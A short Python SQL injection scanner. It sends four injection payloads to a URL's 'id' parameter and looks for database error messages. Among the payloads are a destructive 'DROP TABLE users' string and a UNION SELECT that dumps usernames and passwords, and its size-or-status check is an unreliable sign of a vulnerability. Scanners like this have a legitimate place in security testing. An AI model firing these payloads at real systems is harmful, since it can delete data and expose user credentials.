import requests

def xcheck(url):
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' OR '1'='1' --",
        "' UNION SELECT NULL, username, password FROM users --"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(url, params={'id': payload}, timeout=5)
            response_text = response.text.lower()
            
            vulnerable_indicators = [
                'sql syntax',
                'mysql_fetch',
                'database error',
                'unclosed quotation',
                'you have an error in your sql'
            ]
            
            if any(indicator in response_text for indicator in vulnerable_indicators):
                print(f"SQL Injection vulnerability detected at {url} with payload: {payload}")
                return
            
            if len(response.text) > 10000 or response.status_code != 200:
                print(f"Possible SQL Injection vulnerability at {url} with payload: {payload}")
                return
                
        except requests.RequestException as e:
            print(f"Error testing {url} with payload {payload}: {e}")
            continue
    
    print(f"No SQL Injection vulnerability found at {url}")

if __name__ == "__main__":
    target_url = ""
    xcheck(target_url)